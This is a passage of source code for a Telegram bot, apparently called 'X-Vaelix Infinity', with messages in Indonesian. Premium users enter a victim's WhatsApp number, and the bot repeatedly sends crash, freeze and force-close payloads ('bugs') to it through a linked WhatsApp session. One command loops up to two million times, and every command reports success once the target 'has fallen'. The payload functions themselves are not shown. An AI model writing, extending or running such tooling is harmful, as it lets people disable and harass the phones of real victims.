│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/BlankV2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/BlankV2"] === true) {
    return bot.sendMessage(chatId, "❌ Command /BlankV2 sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /BlankV2`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank No Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 10; i++) {
      await Stuckhome(sock, target);
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank No Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/buldozer (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/buldozer"] === true) {
    return bot.sendMessage(chatId, "❌ Command /buldozer sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /buldozer`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Buldozer
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 2000000; i++) {
      await NoctraBuldo(sock, target);
      await sleep(2000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Buldozer
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/neyrx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/neyrx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /neyrx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /neyrx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif X Force Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 30; i++) {
      await VnXNewblankNotif(sock, target);
      await sleep(2000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif X Force Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/makloe (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/makloe"] === true) {
    return bot.sendMessage(chatId, "❌ Command /makloe sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /makloe`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 70; i++) {
      await VnXNewStuckNotif(sock, target);
      await sleep(2000);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank Notif
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/foreclx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/foreclx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /foreclx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /foreclx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose X Delay
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 20; i++) {
      await RanModzzFC(sock, target);
      await RanModzzForclose(sock, target)
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose X Delay
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/forexit (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/forexit"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forexit sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /forexit`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/RannNewEra ", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1; i++) {
      await RanModzzForclose(sock, target) ;
      await sleep(1500);  
      console.log(chalk.red(`[X-Vaelix Infinity] BUG Processing ${count}/Infinity Loop To ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
